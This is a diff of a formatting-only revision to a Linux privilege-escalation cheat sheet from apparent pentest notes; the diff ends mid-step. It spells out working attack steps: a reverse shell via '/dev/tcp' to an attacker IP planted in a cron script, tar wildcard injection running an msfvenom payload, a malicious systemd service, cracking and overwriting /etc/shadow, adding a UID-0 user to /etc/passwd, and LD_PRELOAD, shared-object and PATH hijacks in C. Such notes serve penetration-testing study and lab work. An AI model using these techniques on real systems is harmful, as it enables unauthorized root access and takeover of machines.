@@ -8,7 +8,7 @@ Our ultimate goal is to escalate from a low privileged user to a user that runs 
 
 Enumerate tools/languages that are installed:
 
-```text
+```
 find / -name perl*
 find / -name python*
 find / -name gcc*
@@ -18,7 +18,7 @@ find / -name go
 
 Enumerate tools for file transfers:
 
-```text
+```
 find / -name wget
 find / -name curl
 find / -name nc*
@@ -33,7 +33,7 @@ find / -name base64
 
 These are the directories that we usually have write access to:
 
-```text
+```
 /dev/shm
 /tmp
 ```
@@ -46,13 +46,13 @@ These are the directories that we usually have write access to:
 
 Display Help:
 
-```text
+```
 ./unix-privesc-check
 ```
 
 Speed Check:
 
-```text
+```
 ./unix-privesc-check standard > filename.txt
 ```
 
@@ -91,7 +91,7 @@ gcc -o <name> <filename.c>
 
 ### Reverse Shells
 
-Alternatively, if a reverse shell is preferred, msfvenom can be used to generate an executable \(.elf\) file:
+Alternatively, if a reverse shell is preferred, msfvenom can be used to generate an executable (.elf) file:
 
 {% embed url="https://wixnic.gitbook.io/hacknotes/shells/msfvenom" %}
 
@@ -101,7 +101,7 @@ Otherwise, you may manually add shells to a file:
 
 ## System Information
 
-### Operating System 
+### Operating System&#x20;
 
 Enumerate the system distribution type and its version:
 
@@ -132,7 +132,7 @@ ls /boot | grep vmlinuz
 
 ### Environment Variables
 
-Enumerate environment variables to find information \(like paths, passwords, API keys, programs, etc\):
+Enumerate environment variables to find information (like paths, passwords, API keys, programs, etc):
 
 ```bash
 (env || set) 2>/dev/null
@@ -158,7 +158,7 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 
 Enumerate users with:
 
-```text
+```
 cat /etc/passwd
 
 # Find users with a shell (bash,sh,zsh,fish,others)
@@ -169,14 +169,14 @@ cat /etc/passwd | grep sh$
 
 Enumerate your group:
 
-```text
+```
 id
 groups
 ```
 
 Find files with a particular group:
 
-```text
+```
 find / -group admin -ls 2>/dev/null 
 ```
 
@@ -233,7 +233,7 @@ rpm -qa | grep program_name #Redhat
 
 ### Process Monitoring
 
-We can use [pspy ](https://github.com/DominicBreuker/pspy)to dynamically monitor the processes are running in the system. Pspy is designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 
+We can use [pspy ](https://github.com/DominicBreuker/pspy)to dynamically monitor the processes are running in the system. Pspy is designed to snoop on processes without the need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute.&#x20;
 
 ```bash
 git clone https://github.com/DominicBreuker/pspy
@@ -246,7 +246,7 @@ python3 -m http.server 80
 
 On the victim machine, download pspy and execute it:
 
-```text
+```
 wget http://10.10.14.8/pspy
 chmod +x pspy
 ./pspy
@@ -260,7 +260,7 @@ Some services store credentials in plaintext in memory. Since the standard behav
 
 We can look up for case insensitive strings in a process as follows:
 
-```text
+```
 strings process_name | grep -i password
 ```
 
@@ -279,7 +279,7 @@ ls -alh /var/cache/yum/
 
 Enumerate useful binaries or tools:
 
-```text
+```
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
 
@@ -296,7 +296,7 @@ ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 
 Common configuration files are these:
 
-```text
+```
 cat /etc/syslog.conf
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
@@ -312,7 +312,7 @@ cat /opt/lampp/etc/httpd.conf
 
 ### Writable .service files
 
-Enumerate if you have `.service` files that you could modify so it executes a shell when the service is started, restarted, or stopped. Sometimes you may need to reboot the machine. 
+Enumerate if you have `.service` files that you could modify so it executes a shell when the service is started, restarted, or stopped. Sometimes you may need to reboot the machine.&#x20;
 
 Enumerating `.service` files in the host:
 
@@ -320,7 +320,7 @@ Enumerating `.service` files in the host:
 find / -iname '*.service' 2>/dev/null
 ```
 
-You can create a shell with something like `ExecStart=/tmp/shell.sh` 
+You can create a shell with something like `ExecStart=/tmp/shell.sh `
 
 ### Writable service binaries
 
@@ -358,7 +358,7 @@ Enumerate Cron Jobs with [pspy](https://github.com/DominicBreuker/pspy):
 
 Review crontabs configuration files:
 
-```text
+```
 cat /var/spool/cron
 cat /var/spool/cron/crontabs
 cat /etc/crontab
@@ -374,7 +374,7 @@ Some things to take into consideration are:
 
 View the contents of the system-wide crontab:
 
-```text
+```
 $ cat /etc/crontab
 ...
 * * * * * root script.sh
@@ -383,14 +383,14 @@ $ cat /etc/crontab
 
 Find the script on the server:
 
-```text
+```
 $ locate script.sh
 /usr/local/bin/script.sh
 ```
 
 Enumerate the file’s permissions:
 
-```text
+```
 $ ls -l /usr/local/bin/script.sh
 -rwxr--rw- 1 root john 40 May 15 2021 /usr/local/bin/script.sh
 ```
@@ -405,9 +405,9 @@ Add a reverse shell code in the script with the following:
 bash -i >& /dev/tcp/YOUR_IP/443 0>&1
 ```
 
-Set up a listener in your host \(e.g Kali or Parrot\) and wait for the cron job to run. A reverse shell running as the root user should be received as soon as the script is executed by the cron:
+Set up a listener in your host (e.g Kali or Parrot) and wait for the cron job to run. A reverse shell running as the root user should be received as soon as the script is executed by the cron:
 
-```text
+```
 # nc –nvlp 443
 Listening on [any] 443 ...
 Connect to [192.168.10.10] from (UNKNOWN) [192.168.10.11] 47555
@@ -432,19 +432,19 @@ chmod +s /tmp/rootbash
 
 Then we make it executable:
 
-```text
+```
 chmod +x cron_job_name.sh
 ```
 
 Now wait for the cron job to run, we can monitor it with:
 
-```text
+```
 watch -n 1 ls -l /tmp/rootbash
 ```
 
 As soon as the cron job runs the script and places SUID bit which is represented as an `s` , then we can spawn bash shell as root with the `-p` option:
 
-```text
+```
 /tmp/rootbash -p
 ```
 
@@ -452,7 +452,7 @@ As soon as the cron job runs the script and places SUID bit which is represented
 
 Enumerate wildcards `*` in a file/script:
 
-```text
+```
 cat /path/to/cronjob_script.sh
 ```
 
@@ -462,9 +462,9 @@ If inside the script there's a line using a wildcard `*` like the following:
 tar czf /tmp/filename.tar.gz *
 ```
 
-With wildcards, we can execute anything and since that's the case then we can search in [GTFOBins](https://gtfobins.github.io/) for a program, in this scenario `tar` and see what we can do, for example executing a shell.
+With wildcards, we can execute anything and since that's the case then we can search in [GTFOBins](https://gtfobins.github.io) for a program, in this scenario `tar` and see what we can do, for example executing a shell.
 
-When some command receives a wildcard character \(\*\) as an argument, the shell first expands the wildcard's filename, this is also known as globbing. A space-separated list of the current directory's file and directory names replaces the wildcard.
+When some command receives a wildcard character (\*) as an argument, the shell first expands the wildcard's filename, this is also known as globbing. A space-separated list of the current directory's file and directory names replaces the wildcard.
 
 Run the following command to better understand what I mean with wildcards:
 
@@ -472,11 +472,11 @@ Run the following command to better understand what I mean with wildcards:
 cd ~ && echo *
 ```
 
-Unix/Linux filesystems are generally generous with filenames and filename expansion occurs before the command is executed, it is possible to communicate command-line options \(e.g., -h, —help\) to programs by creating files with these names.
+Unix/Linux filesystems are generally generous with filenames and filename expansion occurs before the command is executed, it is possible to communicate command-line options (e.g., -h, —help) to programs by creating files with these names.
 
 The commands below should demonstrate how this works:
 
-```text
+```
 $ ls *
 % touch ./-l
 $ ls *
@@ -484,7 +484,7 @@ $ ls *
 
 We can make filenames that correspond to complicated options:
 
-```text
+```
 --option=key=value
 ```
 
@@ -494,7 +494,7 @@ We can make filenames that correspond to complicated options:
 
 Read the contents of the system-wide crontab:
 
-```text
+```
 $ cat /etc/crontab
 ...
 * * * * * root /usr/local/bin/script.sh
@@ -515,20 +515,20 @@ Visit [GTFOBins](https://gtfobins.github.io) and see what you can do with tar wi
 
 Use msfvenom to create a reverse shell ELF payload or manually create file with a reverse shell code:
 
-```text
+```
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f elf -o shell.elf
 ```
 
 Copy the file to the `/home/user` directory on the remote host and create two files in the `/home/user` directory:
 
-```text
+```
 $ touch /home/user/--checkpoint=1
 $ touch /home/user/--checkpoint-action=exec=shell.elf
 ```
 
 Set up a listener to receive a shell when the cron executes the script:
 
-```text
+```
 # nc -nvlp 443
 listening on [any] 443 ...
 connect to [192.168.10.10] from (UNKNOWN) [192.168.10.11] 47556
@@ -584,148 +584,136 @@ cat /etc/login.defs | grep "ENCRYPT_METHOD"
 
 #### Shadow Privilege Escalation
 
-1. Enumerate the permissions of the `/etc/shadow` file:
+1.  Enumerate the permissions of the `/etc/shadow` file:
 
-   ```text
-   $ ls -l /etc/shadow
-   -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
-   ```
+    ```
+    $ ls -l /etc/shadow
+    -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
+    ```
 
-   > Note that it is world readable.
+    > Note that it is world readable.
+2.  Copy the root user’s password hash:
 
-2. Copy the root user’s password hash:
+    ```
+    $ head -n 1 /etc/shadow
+    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
+    RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+    ```
+3.  Paste the password hash in a file (e.g. hash.txt):
 
-   ```text
-   $ head -n 1 /etc/shadow
-   root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
-   RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
-   ```
+    ```
+    $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
+    aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+    ```
+4.  Crack the password hash using john:
 
-3. Paste the password hash in a file \(e.g. hash.txt\):
+    ```
+    $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+    ...
+    password123 (?)
+    ```
+5.  Authenticate with the password cracked:
 
-   ```text
-   $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
-   aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
-   ```
-
-4. Crack the password hash using john:
-
-   ```text
-   $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-   ...
-   password123 (?)
-   ```
-
-5. Authenticate with the password cracked:
-
-   ```text
-   $ su
-   Password:
-   root@victim:/# id
-   uid=0(root) gid=0(root) groups=0(root)
-   ```
+    ```
+    $ su
+    Password:
+    root@victim:/# id
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
 
 #### Alternative Shadow Privilege Escalation Method
 
-1. Enumerate the permissions of the /etc/shadow file:
+1.  Enumerate the permissions of the /etc/shadow file:
 
-   ```text
-   $ ls -l /etc/shadow
-   -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
-   ```
+    ```
+    $ ls -l /etc/shadow
+    -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
+    ```
 
-   > Note that it is world writable.
-
+    > Note that it is world writable.
 2. Back up the contents of /etc/shadow so we can restore it later.
-3. Generate a new SHA-512 password hash with `mkpasswd`:
+3.  Generate a new SHA-512 password hash with `mkpasswd`:
 
-   ```text
-   $ mkpasswd -m sha-512 newpassword
-   $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
-   WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
-   ```
+    ```
+    $ mkpasswd -m sha-512 newpassword
+    $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
+    WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
+    ```
+4.  Modify the /etc/shadow and replace the root user’s password hash with the one you generated.
 
-4. Modify the /etc/shadow and replace the root user’s password hash with the one you generated.
+    ```
+    root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
+    lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
+    ```
+5.  Authenticate with the password cracked:
 
-   ```text
-   root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
-   lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
-   ```
-
-5. Authenticate with the password cracked:
-
-   ```text
-   $ su
-   Password:
-   root@victim:/# id
-   uid=0(root) gid=0(root) groups=0(root)
-   ```
+    ```
+    $ su
+    Password:
+    root@victim:/# id
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
 
 ### /etc/passwd
 
-User password hashes were formerly stored in `/etc/passwd`. If the second field of a user row in contains a password hash, it takes precedence over the hash for backward compatibility. 
+User password hashes were formerly stored in `/etc/passwd`. If the second field of a user row in contains a password hash, it takes precedence over the hash for backward compatibility.&#x20;
 
-If we can only write to the file, we may also create a new user and give them the root user ID \(0\). Because Linux allows several entries for the same user ID as long as the usernames are distinct.
+If we can only write to the file, we may also create a new user and give them the root user ID (0). Because Linux allows several entries for the same user ID as long as the usernames are distinct.
 
 The root account in `/etc/passwd` is usually configured like this:
 
-```text
+```
 root:x:0:0:root:/root:/bin/bash
 ```
 
 The “x” in the second field instructs Unix/Linux to search for the password hash in the /etc/shadow file. In some versions of Unix/Linux, it is possible to simply delete the “x”, which is interpreted as the user having no password:
 
-```text
+```
 root::0:0:root:/root:/bin/bash
 ```
 
 #### /etc/passwd Privilege Escalation
 
-1. Enumerate the permissions of the /etc/passwd file:
+1.  Enumerate the permissions of the /etc/passwd file:
 
-   ```text
-   $ ls -l /etc/passwd
-   -rw-r--rw- 1 root root 951 May 15 2021 /etc/passwd
-   ```
+    ```
+    $ ls -l /etc/passwd
+    -rw-r--rw- 1 root root 951 May 15 2021 /etc/passwd
+    ```
 
-   > Note that it is world writable.
+    > Note that it is world writable.
+2.  Generate a password hash for the password “password” with `openssl`:
 
-2. Generate a password hash for the password “password” with `openssl`:
+    ```
+    $ openssl passwd "password"
+    L9yLGxncbOROc
+    ```
+3.  Modify the `/etc/passwd` file and paste the hash in the second field of the root user row:
 
-   ```text
-   $ openssl passwd "password"
-   L9yLGxncbOROc
-   ```
+    ```
+    root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+    ```
+4.  Authenticate as the root user:
 
-3. Modify the `/etc/passwd` file and paste the hash in the second field of the root user row:
+    ```
+    $ su
+    Password:
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
+5.  Alternatively, append a new row to the file `/etc/passwd` to create an alternate root user:
 
-   ```text
-   root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
-   ```
+    ```
+    rootuser:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+    ```
+6.  Switch to the 'rootuser' user:
 
-4. Authenticate as the root user:
-
-   ```text
-   $ su
-   Password:
-   # id
-   uid=0(root) gid=0(root) groups=0(root)
-   ```
-
-5. Alternatively, append a new row to the file `/etc/passwd` to create an alternate root user:
-
-   ```text
-   rootuser:L9yLGxncbOROc:0:0:root:/root:/bin/bash
-   ```
-
-6. Switch to the 'rootuser' user:
-
-   ```text
-   $ su rootuser
-   Password:
-   # id
-   uid=0(root) gid=0(root) groups=0(root)
-   ```
+    ```
+    $ su rootuser
+    Password:
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+    ```
 
 ### Backups
 
@@ -733,15 +721,14 @@ If a machine's permissions on crucial or sensitive files are how they should be,
 
 #### Backups Privilege Escalation
 
-1. Enumerate for interesting files, especially hidden files or directories:
+1.  Enumerate for interesting files, especially hidden files or directories:
 
-   ```text
-   $ ls -la /home/username
-   $ ls -la /
-   $ ls -la /tmp
-   $ ls -la /var/backups
-   ```
-
+    ```
+    $ ls -la /home/username
+    $ ls -la /
+    $ ls -la /tmp
+    $ ls -la /var/backups
+    ```
 2. You may find credentials, keys, programs, or something interesting/odd.
 
 ## Service Exploits
@@ -752,7 +739,7 @@ Exploiting vulnerable services that are executing as root can result in command 
 
 The following command will show all processes that are running as root:
 
-```text
+```
 $ ps aux | grep "^root"
 ```
 
@@ -760,7 +747,7 @@ $ ps aux | grep "^root"
 
 Running the program with the --version/-v command-line option shows the version number:
 
-```text
+```
 <program> --version
 <program> -v
 dpkg -l | grep <program>
@@ -769,34 +756,32 @@ rpm –qa | grep <program>oftenoften
 
 #### Service Privilege Escalation
 
-1. Enumerate the processes running as root:
+1.  Enumerate the processes running as root:
 
-   ```text
-   ps aux | grep "^root”
-   ```
+    ```
+    ps aux | grep "^root”
+    ```
+2.  Enumerate the version of the program or process that's running:
 
-2. Enumerate the version of the program or process that's running:
-
-   ```text
-   <program> --version
-   ```
-
+    ```
+    <program> --version
+    ```
 3. Search for exploits.
 
 ## Malicious Service
 
 To create a malicious service, the systemctl utility must executable by our current user or group:
 
-```text
+```
 SUID files:
 -rwsr-x--- 1 root pepper 174520 Feb 19 05:18 /bin/systemctl       
 ```
 
 A service is defined by a `.service` file. The `systemctl` is used to link it to `systemd`, and then used again to start the service. What the service does is defined by the `.service` file.
 
- [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a page for `systemctl`, and it gives an example where a single command is executed and output to a file in `tmp`.
+&#x20;[gtfobins](https://gtfobins.github.io/gtfobins/systemctl/) has a page for `systemctl`, and it gives an example where a single command is executed and output to a file in `tmp`.
 
-```text
+```
 pepper@jarvis:/dev/shm$ cat >evil.service<<EOF
 [Service]
 Type=notify
@@ -812,19 +797,19 @@ EOF
 
 Now link this service:
 
-```text
+```
 pepper@jarvis:/dev/shm$ systemctl link /dev/shm/evil.service
 ```
 
 Now start the service, with a `nc` listener ready to catch the shell:
 
-```text
+```
 pepper@jarvis:/dev/shm$ systemctl start evil
 ```
 
 Receive the shell:
 
-```text
+```
 kali@kali$ sudo nc -lnvp 443
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
@@ -874,12 +859,12 @@ Users' commands are recorded in history files when they are using specific progr
 
 ### History Privilege Escalation
 
-1. View the contents of hidden files in the user’s home directory with filenames ending in “history”:
+1.  View the contents of hidden files in the user’s home directory with filenames ending in “history”:
 
-   ```text
-   cat ~/.*history | less
-   history
-   ```
+    ```
+    cat ~/.*history | less
+    history
+    ```
 
 ### SSH Keys
 
@@ -896,23 +881,23 @@ grep -RiE 'password|username|key' / 2>/dev/null
 
 ## SUDO
 
-sudo is a command-line application that allows users to run other programs with the security privileges of other users. By default, that other user will be root. A user must first enter their password and be allowed access via the `/etc/sudoers` file's rule before using sudo \(s\).
+sudo is a command-line application that allows users to run other programs with the security privileges of other users. By default, that other user will be root. A user must first enter their password and be allowed access via the `/etc/sudoers` file's rule before using sudo (s).
 
 Run a program using with sudo privileges:
 
-```text
+```
 sudo <program>
 ```
 
 Run a program as the specified user:
 
-```text
+```
 sudo -u <username> <program>
 ```
 
 List the programs that a user is permitted to run and those that they are not permitted to run:
 
-```text
+```
 sudo -l
 ```
 
@@ -920,7 +905,7 @@ sudo -l
 
 If your low privileged user account can use sudo and can run any programs and you know the user’s password you can switch the user with the `su` command to spawn a root shell:
 
-```text
+```
 sudo su
 ```
 
@@ -928,7 +913,7 @@ sudo su
 
 If the `su` is not available for some reason, there are several other options for escalating privileges:
 
-```text
+```
 sudo -s
 sudo -i
 sudo /bin/bash
@@ -947,7 +932,7 @@ Shell escape sequences can be found here:
 
 1. List the sudo-enabled applications for your user:
 
-```text
+```
 sudo -l
 ...
 (root) NOPASSWD: /usr/sbin/iftop
@@ -959,7 +944,7 @@ sudo -l
 ...
 ```
 
-1. For a shell escape sequence for each program in the list, go to GTFOBins \([https://gtfobins.github.io/](https://gtfobins.github.io/)\).
+1. For a shell escape sequence for each program in the list, go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io)).
 2. Use sudo to launch the application and execute the escape sequence to create a root shell if one is available.
 
 ### Environment Variables
@@ -968,7 +953,7 @@ Environment variables can be retrieved from the user's environment by sudo progr
 
 ### LD\_PRELOAD
 
-The environment variable `LD_PRELOAD` can be used to specify the location of a shared object \(.so\) file. When this option is enabled, the shared object will be loaded first. We can run code as soon as the object is loaded by building a custom shared object and an init\(\) function.
+The environment variable `LD_PRELOAD` can be used to specify the location of a shared object (.so) file. When this option is enabled, the shared object will be loaded first. We can run code as soon as the object is loaded by building a custom shared object and an init() function.
 
 #### Limitations
 
@@ -978,7 +963,7 @@ LD PRELOAD will fail if the effective user ID differs from the genuine user ID. 
 
 1. List the programs that your user has permission to run with sudo:
 
-```text
+```
 $ sudo -l
 Matching Defaults entries for user on this host:
 env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
@@ -987,7 +972,7 @@ env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
 
 > Note that the env\_keep option includes the LD\_PRELOAD environment variable.
 
-Create a file \(preload.c\) with the following contents:
+Create a file (preload.c) with the following contents:
 
 ```c
 #include <stdio.h>
@@ -1019,9 +1004,9 @@ uid=0(root) gid=0(root) groups=0(root)
 
 The `LD_LIBRARY_PATH` environment variable specifies which directories should be examined first for shared libraries.
 
-The **ldd** command can be used to print a program's shared libraries \(.so files\):
+The **ldd** command can be used to print a program's shared libraries (.so files):
 
-```text
+```
 ldd /usr/sbin/program_name
 ```
 
@@ -1031,7 +1016,7 @@ If we construct a shared library with the same name and set `LD_LIBRARY_PATH` to
 
 1. Run **ldd** against the program file:
 
-```text
+```
 $ ldd /usr/sbin/program_name
     linux-vdso.so.1 => (0x00007fff063ff000)
     ...
@@ -1043,7 +1028,7 @@ $ ldd /usr/sbin/program_name
 
 > Hijacking shared objects using this method is hit or miss. Choose one from the list and try it, if it fails try another one.
 
-Create a file \(library\_path.c\) with the following code:
+Create a file (library\_path.c) with the following code:
 
 ```c
 #include <stdio.h>
@@ -1071,7 +1056,7 @@ $ sudo LD_LIBRARY_PATH=. <program_name>
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-## Sticky Bits and SUID/SGID 
+## Sticky Bits and SUID/SGID&#x20;
 
 ### Sticky Bits and SUID/SGID Enumeration
 
@@ -1084,42 +1069,38 @@ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 
 ### Known Exploits
 
-SUID files are used by several programs to facilitate their operation. These SUID files, run as root, and can contain vulnerabilities that we can exploit for a root shell. 
+SUID files are used by several programs to facilitate their operation. These SUID files, run as root, and can contain vulnerabilities that we can exploit for a root shell.&#x20;
 
 #### Known Exploits Privilege Escalation
 
-1. Find SUID/SGID files on the target:
+1.  Find SUID/SGID files on the target:
 
-   ```text
-   $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-   ```
+    ```
+    $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    ```
+2.  Find the version of the binary:
 
-2. Find the version of the binary:
+    ```
+    program -v
+    program --version
+    ```
+3.  Using searchsploit on our localhost, we can try to find local privilege escalation for the program:
 
-   ```text
-   program -v
-   program --version
-   ```
+    ```
+    searchsploit <program>
+    ```
+4.  Make sure the script is executable:
 
-3. Using searchsploit on our localhost, we can try to find local privilege escalation for the program:
+    ```
+    chmod +x exploit.sh
+    ```
+5.  Execute the script to gain a root shell:
 
-   ```text
-   searchsploit <program>
-   ```
-
-4. Make sure the script is executable:
-
-   ```text
-   chmod +x exploit.sh
-   ```
-
-5. Execute the script to gain a root shell:
-
-   ```text
-   $ ./privesc.sh
-   # id
-   uid=0(root) gid=1000(user) groups=0(root)
-   ```
+    ```
+    $ ./privesc.sh
+    # id
+    uid=0(root) gid=1000(user) groups=0(root)
+    ```
 
 ### Shared Object Injection
 
@@ -1127,45 +1108,41 @@ When a program is run, it tries to load the shared objects it needs. We may use 
 
 #### Shared Object Injection Privilege Escalation
 
-1. Enumerate SUID/SGID files on the target:
+1.  Enumerate SUID/SGID files on the target:
 
-   ```text
-   $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-   ```
+    ```
+    $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    ```
+2.  Run strace on the SUID file:
 
-2. Run strace on the SUID file:
+    ```
+    $ strace /usr/local/bin/binary_name 2>&1 | grep -iE "open|access|no such file"
+    ```
+3.  Create the necessary file `<required_name.c>` with the following code:
 
-   ```text
-   $ strace /usr/local/bin/binary_name 2>&1 | grep -iE "open|access|no such file"
-   ```
+    ```
+    #include <stdio.h>
+    #include <stdlib.h>
 
-3. Create the necessary file `<required_name.c>` with the following code:
+    static void inject() __attribute__((constructor));
 
-   ```text
-   #include <stdio.h>
-   #include <stdlib.h>
+    void exec_bash() {
+    	setuid(0);
+    	system("/bin/bash -p");
+    }
+    ```
+4.  Compile the `.so` file:
 
-   static void inject() __attribute__((constructor));
+    ```
+    gcc -shared -fPIC -o filname.so filename.c
+    ```
+5.  Run the SUID executable to get a root shell:
 
-   void exec_bash() {
-   	setuid(0);
-   	system("/bin/bash -p");
-   }
-   ```
-
-4. Compile the `.so` file:
-
-   ```text
-   gcc -shared -fPIC -o filname.so filename.c
-   ```
-
-5. Run the SUID executable to get a root shell:
-
-   ```text
-   $ /usr/local/bin/suid-so
-   # id
-   uid=0(root) gid=1000(user) ...
-   ```
+    ```
+    $ /usr/local/bin/suid-so
+    # id
+    uid=0(root) gid=1000(user) ...
+    ```
 
 ### PATH Environment Variable
 
@@ -1176,76 +1153,70 @@ A list of directories where the shell should look for applications is stored in 
 
 #### Finding Vulnerable Programs
 
-If software tries to run another program, the name of that application is almost certainly stored as a string in the executable file. We can perform inspect the binaries. 
+If software tries to run another program, the name of that application is almost certainly stored as a string in the executable file. We can perform inspect the binaries.&#x20;
 
 {% embed url="https://wixnic.gitbook.io/hacknotes/reversing/inspecting-binaries" %}
 
 Running strings against a file:
 
-```text
+```
 strings /path/to/file
 ```
 
 Running strace against a command:
 
-```text
+```
 strace -v -f -e execve <command> 2>&1 | grep exec
 ```
 
 Running ltrace against a command:
 
-```text
+```
 ltrace <command>
 ```
 
 #### Finding SUID/SGID Vulnerable Privilege Escalation
 
-1. Enumerate SUID/SGID files on the target:
+1.  Enumerate SUID/SGID files on the target:
 
-   ```text
-   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-   ```
+    ```
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    ```
+2.  Enumerate the strings on the SUID file:
 
-2. Enumerate the strings on the SUID file:
+    ```
+    strings /usr/local/bin/binary
+    ```
+3.  We can verify if it executes a service or file with strace:
 
-   ```text
-   strings /usr/local/bin/binary
-   ```
+    ```
+    strace -v -f -e execve /usr/local/bin/binary 2>&1 | grep service
+    ```
+4.  Alternatively, we can also verify with ltrace:
 
-3. We can verify if it executes a service or file with strace:
+    ```
+    ltrace /usr/local/bin/binary 2>&1
+    ```
+5.  Create a file named service.c with the following contents:
 
-   ```text
-   strace -v -f -e execve /usr/local/bin/binary 2>&1 | grep service
-   ```
+    ```
+    int main() {
+     setuid(0);
+     system("/bin/bash -p");
+    }
+    ```
+6.  Compile service.c into a file called service:
 
-4. Alternatively, we can also verify with ltrace:
+    ```
+    gcc -o service service.c
+    ```
+7.  Prepend the current directory to the `$PATH` environment variable, and execute the SUID file to execute a root shell:
 
-   ```text
-   ltrace /usr/local/bin/binary 2>&1
-   ```
-
-5. Create a file named service.c with the following contents:
-
-   ```text
-   int main() {
-    setuid(0);
-    system("/bin/bash -p");
-   }
-   ```
-
-6. Compile service.c into a file called service:
-
-   ```text
-   gcc -o service service.c
-   ```
-
-7. Prepend the current directory to the `$PATH` environment variable, and execute the SUID file to execute a root shell:
-
-   ```text
-   PATH=.:$PATH /usr/local/bin/binary
-   root@victim:~# id
-   uid=0(root) gid=0(root) groups=0(root) ...
-   ```
+    ```
+    PATH=.:$PATH /usr/local/bin/binary
+    root@victim:~# id
+    uid=0(root) gid=0(root) groups=0(root) ...
+    ```
 
 An alternative way to modify the $PATH environment variable is:
 
@@ -1253,57 +1224,51 @@ An alternative way to modify the $PATH environment variable is:
 export PATH=/<directory>:$PATH
 ```
 
-### Bash &lt;4.2-048
+### Bash <4.2-048
 
 It is possible to define user functions with an absolute pathname.
 
-#### Bash &lt;4.2-048 Privilege Escalation
+#### Bash <4.2-048 Privilege Escalation
 
-1. Enumerate SUID/SGID files on the target:
+1.  Enumerate SUID/SGID files on the target:
 
-   ```text
-   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-   ```
+    ```
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    ```
+2.  Enumerate the programs that binary runs with strings:
 
-2. Enumerate the programs that binary runs with strings:
+    ```
+    strings /usr/local/bin/binary_name
+    ```
+3.  We can verify which program is calling with strace:
 
-   ```text
-   strings /usr/local/bin/binary_name
-   ```
+    ```
+    strace -v -f -e execve /usr/local/bin/binary_name 2>&1
+    ```
+4.  Alternatively, we can also verify with ltrace:
 
-3. We can verify which program is calling with strace:
+    ```
+    ltrace /usr/local/bin/binary_name 2>&1 
+    ```
+5.  Verify the version of Bash is lower than 4.2-048:
 
-   ```text
-   strace -v -f -e execve /usr/local/bin/binary_name 2>&1
-   ```
+    ```
+    $ bash --version
+    GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+    ```
+6.  Create a Bash function with the name “/usr/sbin/serviceCalled” (change this to the actual name of the program being called) and export the function:
 
-4. Alternatively, we can also verify with ltrace:
+    ```
